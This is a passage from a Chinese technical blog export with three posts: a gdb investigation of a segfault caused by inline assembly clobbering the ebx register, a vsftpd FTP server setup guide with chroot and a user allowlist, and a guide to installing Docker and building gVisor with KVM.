<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -m32 -g -o time-asm time-asm.c </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gdb time-asm </span></span><br><span class="line">GNU gdb (GDB) 8.3</span><br><span class="line">......</span><br><span class="line">Reading symbols from time-asm...</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x5c8: file time-asm.c, line 4.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/zty/dev/cfile/time-asm </span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at time-asm.c:4</span><br><span class="line">4	int main() &#123;</span><br><span class="line">(gdb) step</span><br><span class="line">8	    __asm__ __volatile__ (</span><br><span class="line">(gdb) step</span><br><span class="line">16	    t = localtime(&amp;tt);</span><br><span class="line">(gdb) step</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x56555440 in localtime@plt ()</span><br></pre></td></tr></table></figure>

<p>从调试结果可以看到，在第 16 行代码处发生了 Segmentation Fault。这说明，<strong>内联汇编代码的执行并没有问题</strong>。</p>
<p>那么，问题就集中在为什么 <code>localtime(&amp;tt)</code> 这个函数调用会 Crash，我于是将上面一段代码的内联汇编部分改写成了正常的 API 调用 <code>tt = time(NULL)</code>，结果当然是可以运行的。我关心的是这两个文件（仅进行 <code>time()</code> 系统调用的手段不一样）的汇编代码有何不同。</p>
<p>使用 <code>gcc -S</code> 命令可以生成汇编文件，查看两个汇编文件的代码之后，发现的不同如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; time.s				|     &#x2F;&#x2F; time-asm.s</span><br><span class="line">subl	$12, %esp		|     mov $0,%ebx</span><br><span class="line">pushl	$0				|     mov $0xd,%eax</span><br><span class="line">call	time@PLT		|     int $0x80</span><br><span class="line">addl	$16, %esp		|</span><br></pre></td></tr></table></figure>

<p>左边就是开辟新的 stack 空间，然后把 0 作为参数传入 <code>time()</code> 函数，最后再把 stack 顶部指针 %esp 归为原位。</p>
<p>右边的就是把 0 赋值给 %ebx 寄存器，然后把系统调用号 13 传给 %eax，最后触发中断向量 0x80。</p>
<p>逻辑上都没有太大的问题，我也看不出有什么不一样的地方，而且两边执行完之后，系统调用的返回值都应该放在 %eax 寄存器里面，那么为了确定之后执行的 <code>localtime()</code> 函数传入的是正确的值，我们再次用 gdb 调试一下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7	    tt &#x3D; time(NULL);</span><br><span class="line">(gdb) info registers </span><br><span class="line">eax            0x0                 0</span><br><span class="line">ecx            0xffffce80          -12672</span><br><span class="line">edx            0xffffcea4          -12636</span><br><span class="line">ebx            0x56556fcc          1448439756</span><br><span class="line">eip            0x565555f3          0x565555f3 &lt;main+42&gt;</span><br><span class="line">(gdb) step</span><br><span class="line">8	    t &#x3D; localtime(&amp;tt);</span><br><span class="line">(gdb) info registers </span><br><span class="line">eax            0x5da8477d          1571309437</span><br><span class="line">ecx            0x5da8477d          1571309437</span><br><span class="line">edx            0x0                 0</span><br><span class="line">ebx            0x56556fcc          1448439756</span><br><span class="line">eip            0x56555603          0x56555603 &lt;main+58&gt;</span><br></pre></td></tr></table></figure>

<p>上述是 <strong>time.c</strong> 编译的可执行文件在执行 <code>tt=time(NULL)</code> 前后的寄存器对比，执行前后，存储内容发生变化的有 eax，ecx，edx，还有 eip。其中 eip 为指令地址寄存器，在这里不需要关注。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7	    __asm__ __volatile__ (</span><br><span class="line">(gdb) info registers </span><br><span class="line">eax            0x0                 0</span><br><span class="line">ecx            0xffffce90          -12656</span><br><span class="line">edx            0xffffceb4          -12620</span><br><span class="line">ebx            0x56556fd0          1448439760</span><br><span class="line">edi            0x0                 0</span><br><span class="line">eip            0x565555d3          0x565555d3 &lt;main+42&gt;</span><br><span class="line">(gdb) step</span><br><span class="line">15	    t &#x3D; localtime(&amp;tt);</span><br><span class="line">(gdb) info registers </span><br><span class="line">eax            0x5da847b2          1571309490</span><br><span class="line">ecx            0xffffce90          -12656</span><br><span class="line">edx            0xffffceb4          -12620</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">eip            0x565555e2          0x565555e2 &lt;main+57&gt;</span><br></pre></td></tr></table></figure>

<p>上述是 <code>time-asm.c</code> 编译的可执行文件在执行内联汇编前后的寄存器对比，执行前后，存储内容发生变化的是 eax，ebx，eip。</p>
<p>根据逻辑判断，eax 记录的是函数的返回值，确实应该改变。那么有什么是<strong>不应该改变的寄存器值</strong>呢？我猜测可能是因为 ebx 值发生改变，导致之后的函数调用出错。</p>
<h3 id="真相大白"><a href="#真相大白" class="headerlink" title="真相大白"></a>真相大白</h3><p>通过 gdb 工具改变 ebx 寄存器的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) set $ebx&#x3D;0x56556fd0</span><br><span class="line">(gdb) step</span><br><span class="line">16	    printf(&quot;time: %d : %d : %d : %d : %d : %d\n&quot;, t-&gt;tm_year, t-&gt;tm_mon, t-&gt;tm_mday, t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec);</span><br><span class="line">(gdb) step</span><br><span class="line">time: 2019 : 9 : 17 : 18 : 51 : 30</span><br><span class="line">17	    return 0;</span><br></pre></td></tr></table></figure>

<p>成功的调用了 <code>localtime()</code> 函数并打印时间。</p>
<p>因此问题就是出在 <code>%ebx</code> 寄存器的值发生改变，和原先的不一致。那么为什么会有这种情况呢？为什么实验服务器 Linux 4.15 的 kernel 下可以正常运行，而我本地的 Linux 5.0 kernel 不能够运行？</p>
<p>带着这个疑问我咨询了导师申文博[^note3] 教授，他指出<strong>内联汇编并不是标准的 c 语言写法，一般汇编语言会单独写成一个文件，若是一定要写内联汇编，那就要严格的按照相关的标准编写。</strong></p>
<p>这是因为编译器有自己的编译规则和优化手段，我们在内联汇编当中使用的寄存器，很有可能会被后续的 gcc 汇编代码所用到，那么如果改变了这个寄存器的值（如本次实验当中的 ebx 寄存器），则会导致意想不到的错误（如 Segmentation Faults 等）。一般在 gcc 的库当中，如果是用汇编语言写的，一定会有对于寄存器的值的保存，利用 push 和 pop 的方法，在 <strong>Caller</strong> 和 <strong>Callee</strong> 两端都对寄存器的内容进行保护，所以内联汇编不建议使用。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>c 语言的内联汇编应该有非常严格的标准，为了操作方便而随意使用寄存器的做法是非常不可取的，套用申老师的话来说，“在 Linux 4.15 上能够成功运行是撞了大运”，同样一个二进制文件在不同的 kernel 版本上不能运行，从结果而言当然是不尽人意的。</p>
<p>对于通用寄存器的保护（eax，ebx，ecx，edx）要和栈指针 ebp 一样重视，同时如果以后遇到了相似的问题，也可以参考本文的方法去解决。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[^note2]: SimonSungm, Master in Zhejiang University：<span class="exturl" data-url="aHR0cHM6Ly9zaW1vbnN1bmdtLmdpdGh1Yi5pby9hYm91dC8=" title="https://simonsungm.github.io/about/">https://simonsungm.github.io/about/<i class="fa fa-external-link"></i></span>.<br>[^note3]: Wenbo Shen, Professor at Zhejiang University: <span class="exturl" data-url="aHR0cHM6Ly93ZW5ib3NoZW4ub3JnLw==" title="https://wenboshen.org/">https://wenboshen.org/<i class="fa fa-external-link"></i></span>.</p>
<p>[^footnote]: </p>
]]></content>
      <categories>
        <category>Language</category>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>c</tag>
        <tag>inline assemble</tag>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>ftp</title>
    <url>/2019/10/06/ftp/</url>
    <content><![CDATA[<p>ftp 是文件传输协议 file transfer protocol 的缩写，现在较为安全的 ftp 工具是 <span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eS5hcHBzcG90LmNvbS92c2Z0cGQuaHRtbA==" title="https://security.appspot.com/vsftpd.html">vsftpd<i class="fa fa-external-link"></i></span>，它针对安全性、性能和稳定性都做了优化，可以较好的防范一些安全性的漏洞，本文仅针对基于 vsftpd 的 ftp 服务器和客户端访问进行了简要描述。</p>
<a id="more"></a>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaG93dG9pbmcuY29tL2hvdy10by1zZXQtdXAtdnNmdHBkLWZvci1hLXVzZXItcy1kaXJlY3Rvcnktb24tdWJ1bnR1LTE4LTA0" title="https://www.howtoing.com/how-to-set-up-vsftpd-for-a-user-s-directory-on-ubuntu-18-04">如何在 Ubuntu 18.04 上为用户目录设置 vsftpd<i class="fa fa-external-link"></i></span>，<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGlnaXRhbG9jZWFuLmNvbS9jb21tdW5pdHkvdXNlcnMvbWVsaXNzYWFuZGVyc29u" title="https://www.digitalocean.com/community/users/melissaanderson">Melissa Anderson<i class="fa fa-external-link"></i></span></p>
<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><p>首先安装 vsftpd</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install vsftpd</span></span><br></pre></td></tr></table></figure>

<p>安装完之后备份配置文件 vsftpd.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.bak</span></span><br></pre></td></tr></table></figure>

<h3 id="Prepare-User"><a href="#Prepare-User" class="headerlink" title="Prepare User"></a>Prepare User</h3><p>添加用来访问 ftp 服务器的用户，<strong>这里请尽量使用 adduser 命令而不是 useradd</strong>，因为会自动在 /home 目录下生成对应的用户文件夹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo adduser share</span></span><br></pre></td></tr></table></figure>

<p>之后根据提示来设置密码和相关信息</p>
<p>当用户被限制在特定目录时，FTP通常更安全。 vsftpd 用 chroot 完成了这个要求。 为本地用户启用 chroot，默认情况下它们仅限于其主目录。 但是，由于 vsftpd 保护目录的方式，用户不能写入。 这对于只应通过FTP连接的新用户来说很好，但如果现有用户也具有shell访问权限，则可能需要写入其主文件夹。</p>
<p>在这个例子中，不是从主目录中删除写权限，而是创建一个 ftp 目录作为 chroot 和一个可写 files 目录来保存实际文件。</p>
<p>创建 ftp 文件夹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir /home/share/ftp</span></span><br></pre></td></tr></table></figure>

<p>设置所有权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chown nobody:nogroup /home/share/ftp</span></span><br></pre></td></tr></table></figure>

<p>删除写权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod a-w /home/share/ftp</span></span><br></pre></td></tr></table></figure>

<p>验证权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ls -la /home/share/ftp</span></span><br><span class="line">Outputtotal 8</span><br><span class="line">4 dr-xr-xr-x  2 nobody nogroup 4096 Aug 24 21:29 .</span><br><span class="line">4 drwxr-xr-x  3 share  share   4096 Aug 24 21:29 ..</span><br></pre></td></tr></table></figure>

<p>接下来创建文件上传目录并为用户分配所有权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir /home/share/ftp/files</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chown share:share /home/share/ftp/files</span></span><br></pre></td></tr></table></figure>

<p>对 ftp 目录的权限检查应返回以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ls -la /home/share/ftp</span></span><br><span class="line">Outputtotal 12</span><br><span class="line">dr-xr-xr-x 3 nobody nogroup 4096 Aug 26 14:01 .</span><br><span class="line">drwxr-xr-x 3 share  share   4096 Aug 26 13:59 ..</span><br><span class="line">drwxr-xr-x 2 share  share   4096 Aug 26 14:01 files</span><br></pre></td></tr></table></figure>

<p>最后，让我们添加一个 test.txt 文件，以便在测试时使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"vsftpd test file"</span> | sudo tee /home/share/ftp/files/test.txt</span></span><br></pre></td></tr></table></figure>

<p>现在我们已经保护了 ftp 目录并允许用户访问 files 目录，让我们修改我们的配置。</p>
<h3 id="Configure"><a href="#Configure" class="headerlink" title="Configure"></a>Configure</h3><p>我们计划允许具有本地shell帐户的单个用户与FTP连接。 这两个关键设置已在 vsftpd.conf 设置。 首先打开配置文件，验证配置中的设置是否与以下设置相匹配</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/vsftpd.conf</span></span><br></pre></td></tr></table></figure>

<p>/etc/vsftpd.conf文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Allow anonymous FTP? (Disabled by default).</span></span><br><span class="line">anonymous_enable=NO</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Uncomment this to allow <span class="built_in">local</span> users to <span class="built_in">log</span> <span class="keyword">in</span>.</span></span><br><span class="line">local_enable=YES</span><br></pre></td></tr></table></figure>

<p>接下来，让我们通过取消注释<code>write_enable</code>设置来允许用户上传文件</p>
<p>/etc/vsftpd.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">write_enable=YES</span><br></pre></td></tr></table></figure>

<p>我们还将取消注释 chroot 以防止 FTP 连接的用户访问目录树之外的任何文件或命令</p>
<p>/etc/vsftpd.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chroot_local_user=YES</span><br></pre></td></tr></table></figure>

<p>我们还添加一个<code>user_sub_token</code>以在<code>local_root directory</code>路径中插入用户名，这样我们的配置将适用于此用户和任何其他未来用户。 在文件中的任何位置添加这些设置</p>
<p>/etc/vsftpd.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user_sub_token=$USER</span><br><span class="line">local_root=/home/$USER/ftp</span><br></pre></td></tr></table></figure>

<p>要根据具体情况允许FTP访问，让我们设置配置，以便用户只有在明确添加到列表时才能访问，而不是默认情况下：</p>
<p>/etc/vsftpd.conf文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">userlist_enable=YES</span><br><span class="line">userlist_file=/etc/vsftpd.userlist</span><br><span class="line">userlist_deny=NO</span><br></pre></td></tr></table></figure>

<p>userlist_deny 切换逻辑：当它设置为 YES，列表中的用户被拒绝 FTP 访问。 当它设置为 NO，只允许列表中的用户访问。</p>
<p>完成更改后，保存文件并退出编辑器。</p>
<p>最后，让我们将用户添加到<code>/etc/vsftpd.userlist</code>。 使用 <em>-a</em> 标志追加到文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"sammy"</span> | sudo tee -a /etc/vsftpd.userlist</span></span><br></pre></td></tr></table></figure>

<p>检查它是否按预期添加</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/vsftpd.userlist</span></span><br><span class="line">share</span><br></pre></td></tr></table></figure>

<p>重新启动守护程序以加载配置更改</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl restart vsftpd</span></span><br></pre></td></tr></table></figure>

<p>配置到位后，继续测试 FTP 访问。</p>
<h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><p>我们已将服务器配置为仅允许用户 share 通过 FTP 连接。 让我们确保它按预期工作。</p>
<p><strong>匿名用户应该无法连接</strong>：我们已禁用匿名访问。 让我们通过尝试匿名连接来测试它。 如果我们的配置设置正确，则应拒绝匿名用户的权限。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp -p &#123;your ftp server ip&#125;</span><br><span class="line">OutputConnected to &#123;your ftp server ip&#125;.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (&#123;your ftp server ip&#125;:default): anonymous</span><br><span class="line">530 Permission denied.</span><br><span class="line">ftp: Login failed.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>

<p>关闭连接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bye</span><br></pre></td></tr></table></figure>

<p><strong>除了 share 之外的用户应该无法连接</strong>：接下来，让我们尝试连接 sudo 用户。 他们也应该被拒绝访问，并且应该在他们被允许输入密码之前发生：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp -p &#123;your ftp server ip&#125;</span><br><span class="line">OutputConnected to &#123;your ftp server ip&#125;.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (&#123;your ftp server ip&#125;:default): sudo_user</span><br><span class="line">530 Permission denied.</span><br><span class="line">ftp: Login failed.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>

<p>关闭连接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bye</span><br></pre></td></tr></table></figure>

<p><strong>用户 share 应该能够连接，读取和写入文件</strong>：让我们确保我们的指定用户可以连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp -p &#123;your ftp server ip&#125;</span><br><span class="line">OutputConnected to &#123;your ftp server ip&#125;.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (&#123;your ftp server ip&#125;:default): share</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: your_user&#39;s_password</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>

<p>让我们切换到<code>files</code>目录并使用<code>get</code>命令将我们之前创建的测试文件传输到本地机器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd files</span><br><span class="line">get test.txt</span><br><span class="line">Output227 Entering Passive Mode (203,0,113,0,169,12).</span><br><span class="line">150 Opening BINARY mode data connection for test.txt (16 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">16 bytes received in 0.0101 seconds (1588 bytes&#x2F;s)</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>

<p>接下来，让我们使用新名称上传文件以测试写入权限：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">put test.txt upload.txt</span><br><span class="line">Output227 Entering Passive Mode (203,0,113,0,164,71).</span><br><span class="line">150 Ok to send data.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">16 bytes sent in 0.000894 seconds (17897 bytes&#x2F;s)</span><br></pre></td></tr></table></figure>

<p>关闭连接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bye</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>gvisor getting started</title>
    <url>/2019/09/20/gvisor-indoor/</url>
    <content><![CDATA[<p>A thorough introduction to gVisor, including compile and further development.</p>
<a id="more"></a>

<h2 id="gVisor-Setup"><a href="#gVisor-Setup" class="headerlink" title="gVisor Setup"></a>gVisor Setup</h2><h3 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h3><p>Docker的安装主要参照Docker官网的教程</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vaW5zdGFsbC9saW51eC9kb2NrZXItY2UvdWJ1bnR1Lw==" title="https://docs.docker.com/install/linux/docker-ce/ubuntu/">Ubuntu<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vaW5zdGFsbC9saW51eC9kb2NrZXItY2UvY2VudG9zLw==" title="https://docs.docker.com/install/linux/docker-ce/centos/">CentOS<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZG9ja2VyLWZvci1tYWMvaW5zdGFsbC8=" title="https://docs.docker.com/docker-for-mac/install/">MacOS<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZG9ja2VyLWZvci13aW5kb3dzLw==" title="https://docs.docker.com/docker-for-windows/">Windows<i class="fa fa-external-link"></i></span></li>
</ul>
<p><strong>注意：可能在安装的过程当中需要翻墙</strong></p>
<p>在安装完成之后，运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo docker run hello-world</span></span><br></pre></td></tr></table></figure>

<p>即可看到hello-world image在docker当中run的结果。</p>
<h4 id="安装须知"><a href="#安装须知" class="headerlink" title="安装须知"></a>安装须知</h4><h5 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h5><p>通过运行以下语句，可以将当前的用户添加进可以运行<strong>docker</strong>的用户当中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo groupadd docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl restart docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> reboot</span></span><br></pre></td></tr></table></figure>

<h5 id="国内镜像设置"><a href="#国内镜像设置" class="headerlink" title="国内镜像设置"></a>国内镜像设置</h5><p>参照<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3h4YjI0OS9hcnRpY2xlL2RldGFpbHMvNzk0Njk1MzQ=" title="https://blog.csdn.net/xxb249/article/details/79469534">docker构建国内镜像服务<i class="fa fa-external-link"></i></span></p>
<p>笔者采用的是阿里云。如果翻墙速度较快的话，用<strong>docker</strong>官方的仓库也行。</p>
<h4 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h4><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2Uv" title="https://yeasy.gitbooks.io/docker_practice/">Docker——从入门到实践<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cudzNjc2Nob29sLmNuL2RvY2tlci8=" title="https://www.w3cschool.cn/docker/">Docker教程<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cua2F0YWNvZGEuY29tL2NvdXJzZXMvZG9ja2Vy" title="https://www.katacoda.com/courses/docker">Learn Docker &amp; Containers using Interactive Browser-Based Scenarios<i class="fa fa-external-link"></i></span></li>
</ul>
<h3 id="gVisor-安装"><a href="#gVisor-安装" class="headerlink" title="gVisor 安装"></a>gVisor 安装</h3><p>本文采用的是<strong>gVisor</strong>在<a href="https://github.com/google/gvisor" target="_blank" rel="noopener"><strong>Github</strong>的安装教程</a>来安装的。如果<strong>不采用编译源码的方式</strong>，可以按照<span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2L2RvY3MvdXNlcl9ndWlkZS9kb2NrZXIv" title="https://gvisor.dev/docs/user_guide/docker/">官方Doc的方法<i class="fa fa-external-link"></i></span>下载安装。</p>
<p>主要的安装步骤如下</p>
<h4 id="Download-gVisor"><a href="#Download-gVisor" class="headerlink" title="Download gVisor"></a>Download gVisor</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://gvisor.googlesource.com/gvisor gvisor</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> gvisor</span></span><br></pre></td></tr></table></figure>

<h4 id="Install-bazel"><a href="#Install-bazel" class="headerlink" title="Install bazel"></a>Install bazel</h4><p>具体参照<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmJhemVsLmJ1aWxkL3ZlcnNpb25zL21hc3Rlci9pbnN0YWxsLXVidW50dS5odG1s" title="https://docs.bazel.build/versions/master/install-ubuntu.html">Bazel官方文档<i class="fa fa-external-link"></i></span></p>
<h4 id="Build-gVisor"><a href="#Build-gVisor" class="headerlink" title="Build gVisor"></a>Build gVisor</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bazel build runsc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp ./bazel-bin/runsc/linux_amd64_pure_stripped/runsc /usr/<span class="built_in">local</span>/bin</span></span><br></pre></td></tr></table></figure>

<h4 id="bazel-build-error"><a href="#bazel-build-error" class="headerlink" title="bazel build error"></a>bazel build error</h4><p>会出现因为网络原因无法 build 的包，这个时候可以搜索 github 关于这些包的镜像<br>我碰到的有 <code>org_golang_x_time</code> 和 <code>org_golang_x_tools</code><br>在 <code>gvisor/WORKSPACE</code> 文件中找到他们对应的 <code>go_repository</code> 替换 <code>importpath</code> 即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go_repository(</span><br><span class="line">    name &#x3D; &quot;org_golang_x_time&quot;,</span><br><span class="line">    commit &#x3D; &quot;c4c64cad1fd0a1a8dab2523e04e61d35308e131e&quot;,</span><br><span class="line">    importpath &#x3D; &quot;github.com&#x2F;golang&#x2F;time&quot;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>我替换的为</p>
<ul>
<li><code>golang.org/x/time</code> -&gt; <code>github.com/golang/time</code></li>
</ul>
<p>还需要更改 3 个文件， 可以使用 <code>grep -r &quot;golang.org/x/time&quot; .</code>，然后根据现实的文件修改内部的相关 <code>import</code> 内容</p>
<p>其他的通过翻墙就可以解决。</p>
<h4 id="关于Docker的设置"><a href="#关于Docker的设置" class="headerlink" title="关于Docker的设置"></a>关于Docker的设置</h4><p>参照<span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2L2RvY3MvdXNlcl9ndWlkZS9kb2NrZXIvI2NvbmZpZ3VyaW5nLWRvY2tlcg==" title="https://gvisor.dev/docs/user_guide/docker/#configuring-docker">Configuring Docker<i class="fa fa-external-link"></i></span></p>
<p>将runsc的目录添加到Docker的配置文件当中</p>
<h4 id="学习资料-1"><a href="#学习资料-1" class="headerlink" title="学习资料"></a>学习资料</h4><p>目前国内关于gVisor的学习资料相对匮乏，所以主要的请参照<span class="exturl" data-url="aHR0cHM6Ly9ndmlzb3IuZGV2L2RvY3Mv" title="https://gvisor.dev/docs/">gVisor官网文档<i class="fa fa-external-link"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9ndmlzb3I=" title="https://github.com/google/gvisor">gVisor源码<i class="fa fa-external-link"></i></span>。</p>
<h4 id="gVisor设置platform为kvm"><a href="#gVisor设置platform为kvm" class="headerlink" title="gVisor设置platform为kvm"></a>gVisor设置platform为kvm</h4><p>安装依赖(Ubuntu)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install qemu-kvm</span></span><br></pre></td></tr></table></figure>
<p>修改/etc/docker/daemon.json文件，增加参数</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"runtimes"</span>: &#123;</span><br><span class="line">        <span class="attr">"runsc-kvm"</span>: &#123;</span><br><span class="line">            <span class="attr">"path"</span>: <span class="string">"/usr/local/bin/runsc"</span>,</span><br><span class="line">            <span class="attr">"runtimeArgs"</span>: [</span><br><span class="line">                <span class="string">"--platform=kvm"</span></span><br><span class="line">            ]</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重启docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl restart docker</span></span><br></pre></td></tr></table></figure>

<p>使用gvisor在docker中运行hello-world</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run runtime=runsc-kvm hello-world</span></span><br></pre></td></tr></table></figure>

<p>正常打出hello world等一系列信息则说明设置gVisor成功。</p>
<h4 id="设置Debug参数"><a href="#设置Debug参数" class="headerlink" title="设置Debug参数"></a>设置Debug参数</h4><p>若要启用调试和系统调用的日志记录，将下面的runtimeArgs添加到Docker配置(<code>/etc/docker/daemon.json</code>)</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"runtimes"</span>: &#123;</span><br><span class="line">        <span class="attr">"runsc-kvm"</span>: &#123;</span><br><span class="line">            <span class="attr">"path"</span>: <span class="string">"/usr/local/bin/runsc"</span>,</span><br><span class="line">            <span class="attr">"runtimeArgs"</span>: [</span><br><span class="line">                <span class="string">"--platform=kvm"</span>,</span><br><span class="line">                <span class="string">"--debug-log=/tmp/runsc/"</span>,</span><br><span class="line">                <span class="string">"--debug"</span>,</span><br><span class="line">                <span class="string">"--strace"</span></span><br><span class="line">            ]</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

